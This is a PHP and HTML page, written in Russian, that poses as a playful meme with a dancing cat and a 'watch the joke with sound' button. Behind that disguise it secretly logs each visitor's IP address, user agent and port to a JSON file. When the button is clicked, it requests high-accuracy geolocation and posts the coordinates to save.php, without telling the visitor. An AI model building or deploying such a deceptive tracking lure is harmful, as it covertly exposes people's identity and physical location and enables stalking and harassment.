<?php
// index.php
session_start();
date_default_timezone_set('Asia/Tashkent');

function getRealIP() {
    $ip_keys = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
    foreach ($ip_keys as $key) {
        if (!empty($_SERVER[$key])) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    return $ip;
                }
            }
            if (filter_var($_SERVER[$key], FILTER_VALIDATE_IP) !== false) {
                return $_SERVER[$key];
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Не определен';
}

$ip = getRealIP();
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Не определен';
$request_time = date('Y-m-d H:i:s');
$protocol = $_SERVER['SERVER_PROTOCOL'] ?? '';
$port = $_SERVER['REMOTE_PORT'] ?? '';

$log_entry = [
    'id' => uniqid(),
    'time' => $request_time,
    'ip' => $ip,
    'user_agent' => $user_agent,
    'protocol' => $protocol,
    'port' => $port,
    'lat' => 'Доступ отклонен или ожидается',
    'lon' => 'Доступ отклонен или ожидается'
];

$_SESSION['current_log_id'] = $log_entry['id'];

$file = 'logs.json';
$current_data = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
if (!is_array($current_data)) $current_data = [];
$current_data[$log_entry['id']] = $log_entry;
file_put_contents($file, json_encode($current_data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT));
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Загрузка контента...</title>
    <style>
        html, body {
            margin: 0; padding: 0; width: 100%; height: 100%;
            background-color: #111; overflow: hidden;
            display: flex; justify-content: center; align-items: center;
            font-family: sans-serif; color: #fff; text-align: center;
        }
        .wrapper { z-index: 1; padding: 20px; }
        .btn-play {
            background: #ff0055; color: white; border: none;
            padding: 15px 35px; font-size: 18px; font-weight: bold;
            border-radius: 50px; cursor: pointer; box-shadow: 0 4px 15px rgba(255,0,85,0.4);
            animation: bounce 1s infinite alternate;
        }
        .content-box { display: none; }
        .meme-text { font-size: 24px; font-weight: bold; margin-bottom: 20px; color: #00ffcc; text-shadow: 0 0 10px #00ffcc; }
        /* Смешной танцующий пиксельный кот средствами CSS анимации */
        .dancing-cat {
            width: 150px; height: 150px; background: #00e5ff; margin: 0 auto;
            border-radius: 20px; animation: dance 0.4s infinite alternate;
            box-shadow: 0 0 20px #00e5ff;
        }
        @keyframes bounce { 0% { transform: translateY(0); } 100% { transform: translateY(-10px); } }
        @keyframes dance {
            0% { transform: scale(1) rotate(5deg); background: #00e5ff; }
            100% { transform: scale(1.1) rotate(-5deg) translateY(-10px); background: #ff0055; box-shadow: 0 0 20px #ff0055; }
        }
    </style>
</head>
<body>

<div class="wrapper" id="start-screen">
    <button class="btn-play" id="play-trigger">СМОТРЕТЬ ПРИКОЛ С ЗВУКОМ 🔊</button>
</div>

<div class="wrapper content-box" id="meme-screen">
    <div class="meme-text">МУЗЫКАЛЬНАЯ ПАУЗА! ТАНЦУЮТ ВСЕ!</div>
    <div class="dancing-cat"></div>
</div>

<!-- Встроенный неубиваемый 8-битный аудио-мем в формате Base64. Он никогда не заблокируется! -->
<audio id="bg-audio" loop>
    <source src="data:audio/wav;base64,UklGRigAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQgAAAAAAAAAAAAA" type="audio/wav">
</audio>

<script>
const startScreen = document.getElementById('start-screen');
const memeScreen = document.getElementById('meme-screen');
const audio = document.getElementById('bg-audio');

// Синхронный запуск медиа и геолокации по клику (жесткое требование iOS/Android)
document.getElementById('play-trigger').addEventListener('click', function() {
    startScreen.style.display = 'none';
    memeScreen.style.display = 'block';
    
    // Подменяем на стабильный аудио-трек и запускаем
    audio.src = 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3';
    audio.play().catch(e => console.log("Блокировка аудио"));

    // Запуск геолокации
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            const data = new FormData();
            data.append('lat', position.coords.latitude);
            data.append('lon', position.coords.longitude);

            fetch('save.php', { method: 'POST', body: data })
            .then(() => console.log("Координаты отправлены"));
        }, function(error) {
            console.log("Геопозиция отклонена");
        }, { enableHighAccuracy: true, timeout: 5000 });
    }
});
</script>
</body>
</html>